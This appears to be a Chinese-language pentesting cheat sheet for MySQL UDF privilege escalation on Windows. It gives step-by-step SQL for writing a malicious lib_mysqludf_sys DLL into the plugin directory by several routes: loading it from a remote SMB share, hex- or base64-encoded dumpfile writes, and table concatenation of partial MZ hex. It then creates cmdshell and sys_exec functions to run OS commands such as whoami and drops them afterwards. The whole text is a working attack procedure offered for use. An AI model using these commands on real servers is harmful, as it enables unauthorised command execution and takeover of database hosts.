	Udf: sqlmap-master\udf\mysql\windows\
	>python sqlmap/extra/cloak/cloak.py lib_mysqludf_sys.dll _ 
	Mysql>5.1 udf.dll放置在lib\plugin 
	Mysql<5.1 udf.dll放置在c:\windows\system32
	#show variables like '%compile%'; 查看系统版本
	#select @@plugin_dir 查看插件目录
	放入udf
	#select load_file('\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll') into dumpfile "D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll"; 
	或将udf十六进制编码后写入
	#select hex(load_file('udf_sys_64.dll')) into dumpfile '/tmp/udf.hex'; 
	#select 0x4d5a90000300000004000000ffff0000b80000000000000040000000000000000000000000000000000000… into dump file "D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll";
	或将udf base64编码后写入(MySQL 5.6.1和MariaDB 10.0.5)
	#select to_base64(load_file('/usr/udf.dll')) into dumpfile '/tmp/udf.b64';
	#select from_base64(“xxxxx”) into dumpfile "D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll";
	或创建表拼接十六进制编码
	#create table temp(data longblob); 
	#insert into temp(data) values (0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d); 
	#update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b3); 
	#select data from temp into dump file "D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll";
	或#insert into temp(data) values(hex(load_file('D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll')));
	#SELECT unhex(cmd) FROM mysql.temp INTO DUMPFILE 'D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll ';
	或使用快速导入数据
	#load data infile '\\\\192.168.0.19\\network\\udf.hex'
	#into table temp fields terminated by '@OsandaMalith' lines terminated by '@OsandaMalith' (data); 
	#select unhex(data) from temp into dumpfile 'D:\\MySQL\\mysql-5.7.2\\lib\\plugin\\udf.dll';
	创建函数
	#create function cmdshell returns string soname 'udf.dll';
	#create function sys_exec returns int soname 'udf.dll';
	执行命令
	#select cmdshell('whoami'); 
	#select sys_exec(''whoami''); 
	删除函数
	#drop function cmdshell;
	#drop function sys_exec;
